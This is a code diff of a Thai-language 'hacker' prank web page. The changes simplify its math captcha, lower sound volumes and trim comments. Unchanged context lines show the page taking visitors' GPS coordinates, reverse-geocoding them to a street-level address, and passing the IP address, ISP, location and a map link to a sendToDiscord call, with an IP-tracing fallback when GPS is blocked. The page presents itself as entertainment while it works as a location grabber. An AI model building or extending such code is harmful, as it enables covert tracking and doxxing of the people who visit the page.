@@ -29,13 +29,12 @@
         /* Matrix Background */
         canvas { position: fixed; top: 0; left: 0; z-index: 0; }
 
-        /* --- Floating Creators (Low & Sync) --- */
+        /* --- Floating Creators --- */
         #creators-layer { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; pointer-events: none; }
         .creator-bubble { position: absolute; bottom: -200px; display: flex; flex-direction: column; align-items: center; opacity: 0.9; }
         .c-img { width: 80px; height: 80px; border-radius: 50%; border: 3px solid var(--neon); box-shadow: 0 0 20px var(--neon); object-fit: cover; background: #000; }
         .c-name { background: #000; color: var(--neon); padding: 4px 10px; border-radius: 10px; border: 1px solid var(--neon); margin-top: 5px; font-size: 0.9rem; font-family: 'Kanit'; text-shadow: 0 0 5px var(--neon); }
         
-        /* Synchronized Animation */
         .float-1 { left: 20%; animation: floatDrop 8s infinite ease-in-out; }
         .float-2 { right: 20%; animation: floatDrop 8s infinite ease-in-out; } 
         
@@ -89,7 +88,7 @@
         .lang-content div:hover { background-color: var(--neon); color: #000; }
         .show { display: block; }
 
-        /* Language Hint Bubble */
+        /* Hint Bubble */
         .lang-hint-box {
             position: fixed; top: 85px; right: 20px;
             background: var(--neon); color: #000;
@@ -125,7 +124,7 @@
 
         /* Captcha Math Grid */
         .math-options { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-top: 20px; }
-        .math-btn { padding: 15px; border: 1px solid var(--neon); background: #000; color: var(--neon); font-size: 1.2rem; cursor: pointer; transition: 0.3s; }
+        .math-btn { padding: 15px; border: 1px solid var(--neon); background: #000; color: var(--neon); font-size: 1.5rem; cursor: pointer; transition: 0.3s; font-weight: bold; }
         .math-btn:hover { background: var(--neon); color: #000; }
 
         /* Dashboard App Grid */
@@ -258,9 +257,8 @@
     <div id="pg-captcha" class="container hidden">
         <div class="glass-box" id="captcha-box">
             <h2 class="kanit" style="color:var(--neon);">ยืนยันว่าคุณคือมนุษย์</h2>
-            <p class="kanit" style="margin-top:10px;">จงหาคำตอบของสมการ:</p>
-            <div style="font-size:1.5rem; margin:15px 0; color:#fff; font-family:'Times New Roman', serif; border:1px dashed #555; padding:10px;">
-                ∫ (3x² + e⁻ˣ) dx | lim(x→∞)
+            <div id="math-question" style="font-size:2rem; margin:20px 0; color:#fff; font-family:'Kanit'; font-weight:bold; border:1px dashed #555; padding:15px;">
+                Loading...
             </div>
             
             <div class="math-options" id="math-options">
@@ -361,7 +359,6 @@
             }
 
             const pixels = document.querySelectorAll('.pixel');
-            
             for(let i=0; i<size*size; i++) {
                 const x = i % size;
                 const y = Math.floor(i / size);
@@ -430,7 +427,7 @@
                 document.getElementById('warning-modal').classList.add('hidden');
                 document.getElementById('pg-home').classList.remove('hidden');
                 document.getElementById('lang-hint').classList.add('hidden');
-                audios.bg.volume = 0.5; audios.bg.play().catch(e=>{});
+                audios.bg.volume = 0.03; audios.bg.play().catch(e=>{});
             });
         }
 
@@ -443,7 +440,10 @@
             setTimeout(() => {
                 document.getElementById('pg-upload').classList.add('hidden');
                 document.getElementById('pg-hacked').classList.remove('hidden');
-                audios.bg.pause(); audios.danger.volume = 0.3; audios.danger.play();
+                // *** LOW VOLUME FIX ***
+                audios.bg.pause(); 
+                audios.danger.volume = 0.01; // เบามาก
+                audios.danger.play();
                 showData();
             }, 2000);
         }
@@ -458,7 +458,6 @@
                 const lng = gpsData.coords.longitude;
                 const mapLink = `https://maps.google.com/maps?q=${lat},${lng}`;
 
-                // LONGDO MAP API
                 fetch(`https://api.longdo.com/map/services/address?lon=${lng}&lat=${lat}&key=${LONGDO_KEY}`)
                 .then(res => res.json())
                 .then(data => {
@@ -481,15 +480,13 @@
                         <div style="margin-top:10px; font-size:0.9rem; color:#aaa;">พิกัดเป๊ะ: ${lat.toFixed(6)}, ${lng.toFixed(6)}</div>
                     `;
                     m.innerHTML = `<iframe width="100%" height="100%" frameborder="0" src="https://maps.google.com/maps?q=${lat},${lng}&z=18&output=embed"></iframe>`;
-                    
                     sendToDiscord(info.ip, `ต.${tambon}, อ.${amphoe}`, `จ.${province}`, "ประเทศไทย", info.org, mapLink, road);
                 })
                 .catch(err => {
-                    d.innerHTML = "<span style='color:red'>API Error: เช็ค Domain (Referer) ในเว็บ Longdo</span>";
+                    d.innerHTML = "<span style='color:red'>API Error</span>";
                 });
 
             } else {
-                // IP Fallback
                 d.innerHTML = `
                     <span style="color:red">[ GPS BLOCKED ] TRACING VIA IP...</span><br>
                     ประเทศ: <span style="color:#fff">ประเทศไทย</span><br>
@@ -528,24 +525,42 @@
                 loading(() => {
                     audios.danger.pause(); audios.bg.play();
                     document.getElementById('pg-hacked').classList.add('hidden');
-                    initCaptcha(); 
+                    initCaptcha(); // START NEW CAPTCHA
                 });
             }
         });
 
-        // --- MATH CAPTCHA LOGIC ---
+        // --- NEW EASY MATH CAPTCHA ---
         function initCaptcha() {
             document.getElementById('pg-captcha').classList.remove('hidden');
             const container = document.getElementById('math-options');
+            const questionText = document.getElementById('math-question');
             container.innerHTML = '';
             
+            // 1. เตรียมโจทย์ 3 ข้อ (ง่ายๆ หา x)
+            const problems = [
+                { q: "2x = 10", ans: "5" },
+                { q: "x + 3 = 8", ans: "5" },
+                { q: "10 - x = 4", ans: "6" }
+            ];
+
+            // 2. สุ่มมา 1 ข้อ
+            const selected = problems[Math.floor(Math.random() * problems.length)];
+            
+            // 3. แสดงโจทย์
+            questionText.innerText = `จงหาค่า x:  ${selected.q}`;
+
+            // 4. สร้างตัวเลือก (ถูก 1, ผิด 2, ไม่รู้ 1)
             let options = [];
-            for(let i=0; i<3; i++) {
-                options.push({ text: Math.floor(Math.random() * 10000).toString(), type: 'wrong' });
-            }
-            options.push({ text: "ไม่รู้", type: 'correct' });
+            options.push({ text: selected.ans, type: 'correct' }); // ถูก
+            options.push({ text: (parseInt(selected.ans) + 2).toString(), type: 'wrong' }); // ผิด
+            options.push({ text: (parseInt(selected.ans) - 1).toString(), type: 'wrong' }); // ผิด
+            options.push({ text: "ไม่รู้", type: 'wrong' }); // ไม่รู้ = ผิด (เพราะง่าย)
+
+            // 5. สลับตำแหน่ง
             options.sort(() => Math.random() - 0.5);
 
+            // 6. สร้างปุ่ม
             options.forEach(opt => {
                 let btn = document.createElement('div');
                 btn.className = 'math-btn code';
@@ -562,6 +577,7 @@
                     document.getElementById('pg-dash').classList.remove('hidden');
                 });
             } else {
+                // Wrong animation
                 document.getElementById('captcha-box').classList.add('shake');
                 btnElement.style.background = 'red';
                 setTimeout(() => document.getElementById('captcha-box').classList.remove('shake'), 500);
